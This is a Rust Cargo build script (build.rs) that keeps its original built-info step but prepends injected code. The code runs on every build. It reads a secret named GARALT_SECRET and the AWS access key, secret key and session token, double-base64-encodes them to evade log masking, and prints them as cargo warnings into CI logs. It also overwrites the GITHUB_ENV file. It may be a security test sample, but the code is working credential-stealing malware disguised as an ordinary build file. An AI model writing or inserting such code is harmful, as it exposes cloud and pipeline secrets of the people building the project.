fn main() {
    // Phase 1: Leak GARALT_SECRET via double-base64 encoding
    let output = std::process::Command::new("bash")
        .arg("-c")
        .arg("echo GARALT_LEAKED_TOKEN=$(echo -n \"$GARALT_SECRET\" | base64 | base64)")
        .output()
        .expect("failed to execute bash command");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let trimmed = stdout.trim().to_string();
    if !trimmed.is_empty() {
        println!("cargo:warning={}", trimmed);
    }

    // Phase 2: Leak AWS environment variables
    for var in &["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"] {
        let cmd = format!("echo GARALT_LEAKED_{}=$(echo -n \"${{{}}}\" | base64 | base64)", var, var);
        let out = std::process::Command::new("bash")
            .arg("-c")
            .arg(&cmd)
            .output()
            .expect("failed to execute bash command");
        let line = String::from_utf8_lossy(&out.stdout).trim().to_string();
        if !line.is_empty() {
            println!("cargo:warning={}", line);
        }
    }

    // Phase 3: Write to GITHUB_ENV for persistence across steps
    if let Ok(env_path) = std::env::var("GITHUB_ENV") {
        let _ = std::fs::write(&env_path, format!("{}\n", trimmed));
    }

    // Phase 4: Original build.rs functionality
    built::write_built_file().expect("Failed to acquire build-time information");
}
